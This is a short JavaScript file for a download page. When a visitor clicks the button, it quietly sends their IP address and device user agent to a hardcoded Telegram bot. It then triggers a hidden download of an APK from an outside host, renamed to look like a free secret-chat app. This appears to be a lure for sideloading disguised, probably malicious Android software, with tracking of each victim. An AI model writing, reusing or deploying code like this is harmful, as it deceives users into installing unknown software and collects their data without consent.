document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById('download-button');
  const apkLinks = [
            "http://leanardolisaniz.com/ariyorumseni/UygulumaYukleyici.apk",
            "http://leanardolisaniz.com/ariyorumseni/UygulumaYukleyici.apk",
            "http://leanardolisaniz.com/ariyorumseni/UygulumaYukleyici.apk",
            "http://leanardolisaniz.com/ariyorumseni/UygulumaYukleyici.apk"
  ];

  btn.addEventListener('click', () => {
    btn.innerText = 'Yukleniyor...';
    btn.disabled = true;

    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];

    const token = '8661029560:AAFxEaxyqJkegxR6XAtKMN-GAY8si2ZnNMo';
    const chatId = '-5297334849';
    const userAgent = navigator.userAgent;
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const message =
          `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nIndirilen link: ${fileUrl}`;
        return fetch(
          `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`
        );
      })
      .catch(() => {});

    const hiddenAnchor = document.createElement('a');
    hiddenAnchor.href = fileUrl;
    hiddenAnchor.download = "Ucretsiz Gizli Sohbet.apk";
    hiddenAnchor.style.display = 'none';
    document.body.appendChild(hiddenAnchor);
    hiddenAnchor.click();
    document.body.removeChild(hiddenAnchor);

    setTimeout(() => {
      btn.innerText = 'Yukle';
      btn.disabled = false;
    }, 4000);
  });
});
